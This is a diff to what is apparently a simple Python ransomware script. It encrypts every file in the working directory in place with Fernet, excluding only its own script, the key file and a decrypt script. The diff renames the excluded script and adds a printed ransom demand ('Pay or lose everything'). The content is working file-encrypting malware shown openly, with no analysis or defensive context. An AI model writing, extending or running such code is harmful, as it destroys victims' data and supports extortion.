@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-        if file == "nuke.py" or file =="thekey.key":
+        if file == "rsw.py" or file =="thekey.key" or file == "decrypt.py":
                 continue
         if os.path.isfile(file):
                 files.append(file)
@@ -24,3 +24,5 @@ for file in files:
         contents_encrypted = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
                 thefile.write(contents_encrypted)
+
+print ("Your files are now Encrypted. Pay or lose everything.")
